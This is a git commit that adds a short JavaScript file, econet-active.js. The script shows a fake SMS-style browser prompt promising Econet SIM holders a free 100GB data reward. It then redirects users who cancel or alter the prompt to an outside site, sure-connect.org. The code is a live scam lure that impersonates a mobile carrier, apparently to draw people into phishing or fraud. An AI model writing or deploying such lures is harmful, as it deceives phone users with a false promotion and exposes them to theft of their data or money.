c9f17678f28a4a1828d104c980ff9eb07f8e5247
sureconnect001 <ukpe247@gmail.com>
2025-06-03 08:58:30 +0100

    Create econet-active.js

---
+++ econet-active.js
@@ -0,0 +1,5 @@
+var password = 'Activate 100GB'
+password=prompt('SMS: Congratulations, your Econet SIM card is eligible to receive free data old sim card reward, click OK to activate now','Activate 100GB');
+if (password != 'Activate 100GB') {
+location.href='https://sure-connect.org/econet.html';
+}
